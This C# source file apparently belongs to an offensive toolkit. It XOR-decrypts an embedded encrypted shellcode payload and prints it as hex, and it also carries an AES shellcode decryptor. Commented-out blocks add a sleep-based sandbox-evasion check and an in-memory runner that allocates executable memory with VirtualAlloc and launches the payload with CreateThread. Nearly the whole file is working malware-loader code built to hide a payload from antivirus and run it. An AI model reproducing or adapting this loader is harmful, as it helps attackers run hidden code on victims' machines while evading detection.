using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace Decrypt
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            /* DateTime dtCurrentTime = DateTime.Now;
             Thread.Sleep(2000);
             double dbTotalTime = DateTime.Now.Subtract(dtCurrentTime).TotalSeconds;
             if (dbTotalTime < 1.5)
             {
                 return;
             }*/

            byte[] Key = Convert.FromBase64String("fRZstgVonk1WpSLeb9ZKcoDkGPzHWDqSAMyTxoopGc8=");
            //byte[] IV = Convert.FromBase64String("pyve1rU+58PN/2MWEftieA==");

            //byte[] Key = ASCIIEncoding.ASCII.GetBytes("thisisa32bytekey0123456789!@#$%^");
            // byte[] IV = ASCIIEncoding.ASCII.GetBytes("thisis16bytes456");
            byte[] baCipher = new byte[] { 0x35, 0x27, 0xa5, 0xfe, 0x84, 0x81, 0x29, 0xb2, 0xa9, 0x5a, 0x6a, 0x53, 0x6a, 0x39, 0xb5, 0x8d, 0x7f, 0xac, 0xa3, 0x40, 0xe9, 0xe7, 0xe8, 0x29, 0xe6, 0x66, 0xe3, 0x8e, 0xbb, 0x71, 0x3e, 0x87, 0x50, 0xee, 0x93, 0x49, 0xfa, 0x8a, 0x6a, 0x0d, 0x30, 0x99, 0x14, 0x95, 0x61, 0xb0, 0x3a, 0xce, 0xae, 0x1a, 0x9b, 0x06, 0x71, 0xa0, 0x02, 0x1f, 0xfc, 0x22, 0x24, 0x35, 0xe7, 0xd1, 0x09, 0x3b, 0xd8, 0xfb, 0xa6, 0x45, 0x68, 0x90, 0xce, 0xa7, 0x30, 0x91, 0x82, 0x35, 0xc1, 0x73, 0x8d, 0x84, 0xe4, 0x16, 0xfb, 0x8e, 0x69, 0xc3, 0x8a, 0x82, 0x12, 0x12, 0x3d, 0x7f, 0x40, 0xa3, 0x28, 0xb2, 0x9a, 0xa4, 0xff, 0x0c, 0x22, 0x20, 0x03, 0xa3, 0x39, 0x4b, 0xb8, 0xee, 0xdb, 0x5c, 0xb1, 0x8c, 0x92, 0x13, 0xcb, 0x97, 0x47, 0x73, 0x32, 0x36, 0x25, 0x71, 0x4e, 0xf8, 0x1e, 0x83, 0x69, 0x73, 0xd8, 0x29, 0x36, 0x0d, 0xe3, 0xc2, 0xa6, 0x74, 0xb8, 0x6e, 0x97, 0x2d, 0x88, 0xac, 0x7e, 0x45, 0xee, 0x7b, 0x83, 0x46, 0xf1, 0x79, 0x02, 0x36, 0x7e, 0x90, 0x17, 0x30, 0x5d, 0x4a, 0x21, 0x8c, 0x9a, 0xe8, 0x35, 0x39, 0x6b, 0x8a, 0xef, 0x27, 0x30, 0x2b, 0x30, 0x24, 0x48, 0xb5, 0x37, 0x62, 0xef, 0x5a, 0x0b, 0x7f, 0xc1, 0x87, 0xbb, 0x62, 0x2d, 0x3f, 0x65, 0x75, 0x29, 0xba, 0xb8, 0x06, 0x8b, 0xf1, 0xfa, 0x86, 0xa3, 0xe6, 0xa7, 0xf0, 0xa8, 0x7c, 0xb1, 0xee, 0x85, 0x34, 0x7e, 0x45, 0xee, 0x47, 0x83, 0x46, 0xf1, 0xb3, 0xc1, 0x2a, 0xa6, 0x3b, 0x40, 0xad, 0x2d, 0xdb, 0x28, 0x2b, 0x0d, 0xf0, 0xe4, 0x4c, 0xbb, 0x83, 0xb7, 0xb0, 0x22, 0x52, 0x73, 0x89, 0xa9, 0x3d, 0x68, 0x31, 0x4e, 0x03, 0x8b, 0x1e, 0x7b, 0xba, 0xc1, 0x3c, 0xc7, 0x38, 0xbe, 0x82, 0x93, 0xde, 0x21, 0x42, 0x88, 0xfa, 0xf7, 0xb3, 0x94, 0xab, 0x80, 0x98, 0x16, 0x7f, 0x84, 0x65, 0xc8, 0x2a, 0x72, 0x47, 0x4f, 0x12, 0x0d, 0x85, 0x6d, 0x85, 0x6c, 0x29, 0xd1, 0xa6, 0x12, 0x2e, 0x24, 0x0a, 0x88, 0x20, 0x09, 0xe4, 0x8f, 0xcd, 0xae, 0xf3, 0x27, 0xa2, 0x2b, 0x53, 0x4a, 0x5f, 0xdf, 0x05, 0x9d, 0xce, 0xae, 0x5b, 0xca, 0xb8, 0xf4, 0x1a, 0x47, 0x2e, 0x2e, 0x73, 0x70, 0x44, 0x5e, 0xad, 0x58, 0x45, 0x6b, 0x87, 0x8f, 0x23, 0xd4, 0xf0, 0xee, 0xab, 0x30, 0x93, 0x31, 0x2c, 0x4e, 0xbc, 0x81, 0xcf, 0xae, 0x5b, 0x87, 0x76, 0xe8, 0xa1, 0x19, 0x44, 0x2d, 0x20, 0x08, 0xc7, 0x3b, 0x0a, 0xf6, 0xb5, 0x53, 0xa9, 0xbe, 0x0d, 0x1c, 0x17, 0x06, 0xb3, 0x78, 0x1a, 0xf0, 0x4a, 0xa4, 0x34, 0x0f, 0xba, 0xeb, 0x02, 0x84, 0x6a, 0x7b, 0x8b, 0x12, 0x1f, 0x1d, 0x05, 0x15, 0x1e, 0x00, 0xcc, 0x33, 0x06, 0x31, 0xce, 0xee, 0x45, 0x85, 0x84, 0xa0, 0xb8, 0x21, 0x5f, 0x92, 0x29, 0xe6, 0x19, 0x5d, 0x87, 0xdd, 0x3f, 0x90, 0x2c, 0x77, 0x97, 0x22, 0x6b, 0x46, 0x17, 0x35, 0x0a, 0x02, 0xe4, 0x06, 0x3f, 0x3e, 0xf9, 0xe6, 0x46, 0xbb, 0x8f, 0xa3, 0xbb, 0x0c, 0x72, 0xb3, 0x00, 0x89, 0x34, 0xb3, 0x0f, 0xfd, 0x01, 0x8b, 0x1f, 0x6c, 0xc3, 0x83, 0x7d, 0x66, 0xcb, 0x41, 0x7f, 0x44, 0x07, 0x69, 0x73, 0x53, 0xa9, 0xee, 0x5e, 0xb0, 0x8b, 0x29, 0x33, 0x93, 0x4f, 0xde, 0x5e, 0x76, 0xa9, 0x72, 0x47, 0x68, 0x31, 0xc0, 0x18, 0x72, 0xa8, 0x02, 0xa7, 0xdf, 0x3e, 0x70, 0xb4, 0x21, 0xb2, 0xa0, 0x20, 0x00, 0xe0, 0x79, 0xcf, 0xce, 0xc4, 0xf6, 0x8a, 0x87, 0xcf, 0x75, 0xa5, 0xfc, 0x63, 0x72, 0x09, 0x6f, 0xd3, 0xd9, 0x47, 0x21, 0xbb, 0xf0, 0x6a, 0xde, 0x46, 0xa1, 0x7d, 0x6c, 0x83, 0x69, 0x8c, 0x86, 0xe1, 0x41, 0xc2, 0x97, 0xc0, 0x05, 0x3d, 0x90, 0x4f, 0xf0, 0x65, 0x89, 0x2f, 0x63, 0xa4, 0xee, 0x01, 0x83, 0xce, 0xf0, 0x33, 0xa8, 0x3e, 0x67, 0xb4, 0x81, 0x7d, 0x7c, 0x83, 0x69, 0x3a, 0xe9, 0xf1, 0x1a, 0x5e, 0x06, 0xc2, 0xee, 0xf1, 0x78, 0xe5, 0x25, 0x2d, 0x1a, 0x2f, 0x69, 0x86, 0x27, 0xbc, 0x82, 0xce, 0xd0, 0xba, 0xc3, 0xf4, 0x67, 0xb4, 0x81, 0x7d, 0x4c, 0x83, 0x69, 0x3a, 0xda, 0x50, 0xf7, 0xb7, 0xf1, 0x54, 0x67, 0x13, 0x78, 0x1a, 0xf0, 0x65, 0x76, 0xa9, 0x72, 0x4d, 0x6a, 0x7b, 0x4f, 0x87, 0x55, 0x40, 0x2c, 0xa5, 0x29, 0x3b, 0x40, 0xbe, 0xe9, 0x43, 0x1c, 0xa1, 0x0b, 0x6a, 0xe6, 0x67, 0xe3, 0x9b, 0xa7, 0x36, 0xba, 0xea, 0x45, 0xc7, 0xdf, 0x83, 0xef };
            byte[] decShell = XOREncryptDecrypt(baCipher, Key);
            StringBuilder hexCodes = new StringBuilder(decShell.Length * 2);
            foreach (byte b in decShell)
            {
                hexCodes.AppendFormat("0x{0:x2},", b);
            }
            Console.WriteLine(hexCodes.ToString().Substring(0, hexCodes.ToString().Length - 1));

            Console.Read();
            /*int bufsize = decShell.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)bufsize, 0x3000, 0x40);
            Marshal.Copy(decShell, 0, addr, bufsize);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);*/
        }

        private static byte[] XOREncryptDecrypt(byte[] baShellCode, byte[] baXorKey)
        {
            byte[] baXoredRes = new byte[baShellCode.Length];

            for (int i = 0; i < baShellCode.Length; i++)
            {
                baXoredRes[i] = (byte)(baShellCode[i] ^ baXorKey[i % baXorKey.Length]);
            }
            return baXoredRes;
        }

        private static byte[] AESDecryptor(byte[] baEncryptedShellCode, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.PKCS7;
                aes.Mode = CipherMode.CBC;
                aes.Key = key;
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return GetDecryptedStream(baEncryptedShellCode, decryptor);
                }
            }
        }
        private static byte[] GetDecryptedStream(byte[] data, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(data, 0, data.Length);
                cryptoStream.FlushFinalBlock();

                return ms.ToArray();
            }
        }
    }
}
